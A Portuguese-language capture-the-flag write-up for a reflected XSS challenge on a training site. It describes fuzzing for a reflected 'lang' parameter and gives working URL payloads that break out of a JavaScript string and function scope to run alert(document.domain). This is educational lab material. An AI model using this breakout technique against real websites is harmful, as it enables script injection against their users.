Resolução do Desafio "DOM" XSS Reflected - https://bountyleaks.cf/challenge/dom.php

1.  Ao acessarmos a página, vemos um trecho de código em JS
```
// Its not used anymore
function display_message(){
 var lang = "en-US";
 if(lang == "en-US"){
  var message = "Welcome!";
  return message 
 }
 var message = "Bem-vindo!";
 return message;
}

// just say hello, doesnt matter what language do you speak, english is universal LOL
document.write('<h1>Welcome hacker =)</h1>');
```
2. Nesse ponto, levanta-se a suspeita que existe alguma querystring / parâmetro de URL que podemos manipular

Provavelmente a aplicação detecta qual o idioma do navegador do usuário ou aceita receber isso via parâmetro (refletindo na página).

3. Como não temos certeza, aqui caberiam duas abordagens:

3.1 Verificar que existem duas variáveis JS (lang e message) e verificar se via querystring elas são refletidas na página (?lang=teste e ?message=teste)

3.2 Utilizar algum fuzzer (ffuf, x8, dalfox, arjun) para usar um arquivo / lista cheio de parâmetros e ver qual pode estar refletindo na página: comando -url https://bountyleaks.cf/challenge/dom.php?FUZZAQUI=teste

4. Fazendo algum destes modos supracitados, chegamos a conclusão que acessando: https://bountyleaks.cf/challenge/dom.php?lang=123, faz com que o trecho de código da página vire:
```
// Its not used anymore
function display_message(){
 var lang = "123";
```
Dessa forma o valor informado pelo usuário via URL está refletindo na página (dando margem para injeção de códigos)
5. Como já estamos dentro de um contexto JS (dentro das tags script), não é preciso que a gente reabra essas tags para executar um javascript, mas mesmo assim, podemos confirmar que a aplicação não permite tags como < e > : https://bountyleaks.cf/challenge/dom.php?lang=123< 
Ao acessá-la, o parâmetro "var lang" volta para seu valor padrão: "en-US"
6. Então para executar o XSS, vamos precisar ter um pouco de conhecimento de JS, pois é o contexto que estamos inseridos: 

6.1 Nossa entrada de dados está sendo refletida dentro de um valor de variável (lang) que está dentro de uma função chamada display_message(), que por sua vez não é chamada automaticamente pelo site, somente declarada

6.2 Precisaremos, então, sair do contexto dessa função que não é chamada, para que nosso XSS seja executado assim que o usuário entrar na página

6.3 Para isso, precisamos fechar aquela chave da função display_message () "{", com uma chave fechando esse bloco de código: "}"

6.4 Caso acessássemos a URL: https://bountyleaks.cf/challenge/dom.php?lang=";%0a}%0aalert(123);// 
Considerando %0a para \n (quebra de linha), ficando o trecho de código do nosso site agora:
``` 
function display_message(){
 var lang = " ";
}
alert(123);//";
if(lang == "en-US"){
  var message = "Welcome!";
  return message 
 }
 var message = "Bem-vindo!";
 return message;
}
```

6.5 Conseguimos! Saímos do escopo da função JS, mas o JS não irá triggar, devido a um erro de sintaxe:
Não estamos mais dentro de uma função e existe linhas falando "return". O valor vai ser retornado pra onde? Não existe função englobando ela para esse retorno ficar explícito.
Esse erro inclusive será alertado em seu console do navegador. Qualquer erro de sintaxe JS dos sites voltam nele.

6.6 Vamos então criar uma outra função, fingindo que existe uma outra função logo após, englobando esses returns, então:
https://bountyleaks.cf/challenge/dom.php?lang=%22;%0a}%0aalert(document.domain);%0afunction%20nuncaserachamada(){//
Ficando nosso código:
```
function display_message(){
 var lang = "";
}
alert(123);
function nuncaserachamada(){//";
 if(lang == "en-US"){
  var message = "Welcome!";
  return message 
 }
 var message = "Bem-vindo!";
 return message;
}
```

Pronto =), XSS executado o/
